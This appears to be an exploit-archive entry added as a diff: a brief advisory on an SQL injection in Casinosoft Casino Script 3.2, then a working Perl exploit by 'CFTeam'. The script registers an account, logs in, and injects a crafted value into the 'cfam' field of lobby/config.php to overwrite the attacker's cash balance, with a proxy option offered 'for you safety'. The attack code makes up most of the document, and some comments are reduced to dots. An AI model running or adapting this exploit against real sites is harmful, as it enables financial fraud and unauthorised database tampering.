@@ -1,0 +1,104 @@
+source: http://www.securityfocus.com/bid/20646/info
+
+Casinosoft Casino Script is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.
+
+Version 3.2 is vulnerable; other versions may also be affected.
+
+#!/usr/bin/perl
+
+## Massvet ........ ...... - ......... .......... .......!
+## ........ ...... 3.2, ........ ..... ......, . .......... magicquotes
+## ......... .. ...... 3.2
+##
+## writed bu G1UK
+## CFTeam
+
+use LWP::UserAgent;
+use Getopt::Std;
+use HTTP::Cookies;
+
+getopts("h:d:l:p:c:x:");
+
+$host = $opt_h;
+$dir = $opt_d || '/';
+$login = $opt_l;
+$pass = $opt_p;
+$cash = $opt_c;
+$proxy = $opt_x || '';
+logo();
+
+
+if(!$host||!$login||!$pass||!$cash) { help(); }
+
+print "=) server : $host \r\n";
+print "=) casino dir : $dir \r\n";
+print "=) login : $login \r\n";
+print "=) password : $pass \r\n";
+print "=) cash : $cash \r\n";
+print "\r\n";
+
+$cook = LWP::UserAgent->new() or die;
+$cookie = HTTP::Cookies->new();
+$cook->cookie_jar( $cookie );
+$url=$host.''.$dir;
+$cook->proxy('http'=>'http://'.$proxy) if $proxy;
+
+printf "Registering =)\r\n";
+$res = $cook->post('http://'.$url.'reg.php',
+[
+"r_login" => "$login",
+"r_pass" => "$pass",
+"r_email" => "1",
+"send" => "1",
+"submit"=> "........."
+]);
+print "Registering OK\r\n";
+
+print "Enter =)\r\n";
+$res = $cook->post('http://'.$url.'lobby/login_proc.php',
+[
+"log" => "$login",
+"psw" => "$pass",
+"send" => "1",
+"submit"=> ".....",
+"Cookie" => "PHPSESSID=".$sid
+]);
+print "Enter OK\r\n";
+
+print "Edit you cash =))\r\n";
+$res = $cook->post('http://'.$url.'lobby/config.php',
+[
+"cpass" => "$pass",
+"cname" => "",
+"cfam" => "',cash='".$cash."' where login='".$login."'/*",
+"send" => "1",
+"Cookie" => "PHPSESSID=".$sid
+]);
+print "Check out you cash =)\r\n";
+
+sub logo()
+{
+print 
+"<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\r\n";
+print "Massvet internet casino v3.2 sql injection cash exploit by 
+CFTeam\r\n";
+print 
+"<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\r\n";
+}
+
+sub help()
+{
+print "CFteam.pl -h <host> -d [dir] -l <login> -p <password> -c <cash> 
+-x [proxy]\r\n\r\n";
+print "<host> - Host where cazino installed for example - 
+www.massvet.ru\r\n";
+print "[dir] - Directory, where cazino is installed /cazino/ for 
+example\r\n";
+print "<login> - User name for registrate \r\n";
+print "<password> - Password for registrate \r\n";
+print "<cash> - How much you need? (00.00)\r\n";
+print "[proxy] - For you safety \r\n";
+exit();
+}
